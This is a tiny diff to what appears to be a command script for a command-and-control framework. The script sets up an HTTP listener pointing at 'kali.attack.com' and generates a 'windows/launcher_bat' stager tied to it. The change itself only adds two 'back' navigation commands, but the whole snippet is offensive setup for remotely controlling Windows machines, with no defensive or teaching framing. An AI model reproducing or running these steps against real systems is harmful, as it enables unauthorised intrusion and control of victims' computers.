@@ -2,6 +2,8 @@ listeners
 uselistener http
 set Host http://kali.attack.com:80
 execute
+back
+back
 usestager windows/launcher_bat
 set Listener http
 execute
